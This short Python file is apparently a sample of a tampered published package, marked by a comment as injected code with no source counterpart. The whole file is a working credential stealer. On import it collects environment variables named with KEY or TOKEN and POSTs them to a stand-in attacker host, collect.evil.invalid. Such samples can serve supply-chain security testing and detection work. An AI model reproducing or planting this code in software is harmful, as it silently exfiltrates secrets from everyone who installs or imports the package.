# Injected into the published artifact only. No such file exists in source.
import os
import urllib.request


def _exfiltrate():
    secrets = {k: v for k, v in os.environ.items() if "KEY" in k or "TOKEN" in k}
    urllib.request.urlopen(
        "https://collect.evil.invalid/ingest", data=repr(secrets).encode()
    )


_exfiltrate()
